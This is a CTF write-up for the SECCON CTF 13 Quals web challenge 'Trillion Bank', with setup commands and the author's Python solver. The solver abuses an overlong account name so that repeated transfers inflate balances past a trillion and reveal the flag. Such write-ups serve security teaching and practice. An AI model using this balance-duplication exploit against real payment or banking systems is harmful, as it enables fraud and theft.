---
title: "Trillion Bank - SECCON CTF 13 Quals 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "trillion", "bank", "web", "seccon-ctf-13-quals"]
summary: "Can you get over $1,000,000,000,000?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/trillion-bank"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "Trillion Bank"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/trillion-bank>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [web] Trillion Bank

## Description

Can you get over **$1,000,000,000,000**?

- Challenge: `http://trillion.seccon.games:3000`

## Attachments

- [trillion](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/trillion-bank/solver/exploit.py>

```python
import os
import random
import string
import httpx

BASE_URL = (
    f"http://{os.getenv("SECCON_HOST", "localhost")}:{os.getenv("SECCON_PORT", "3000")}"
)

root_name = "".join(random.choices(string.ascii_lowercase, k=65535))
res = httpx.post(f"{BASE_URL}/api/register", json={"name": root_name})
assert res.status_code == 200

names = [root_name + "0", root_name + "1"]
balances = [10, 10]
clients = [
    httpx.Client(base_url=BASE_URL),
    httpx.Client(base_url=BASE_URL),
]

for i in range(2):
    res = clients[i].post("/api/register", json={"name": names[i]})
    assert res.status_code == 200, res.json()


def transfer(sender_id: int):
    recipient_id = sender_id ^ 1

    res = clients[sender_id].post(
        "/api/transfer",
        json={"recipientName": root_name, "amount": balances[sender_id]},
    )
    assert res.status_code == 200, res.json()

    balances[recipient_id] += balances[sender_id]


while balances[0] < 1_000_000_000_000:
    for i in range(2):
        transfer(i)
    print(balances)  # Fibonacci sequence

res = clients[0].get("/api/me")
assert res.status_code == 200
print(res.json()["flag"])
```
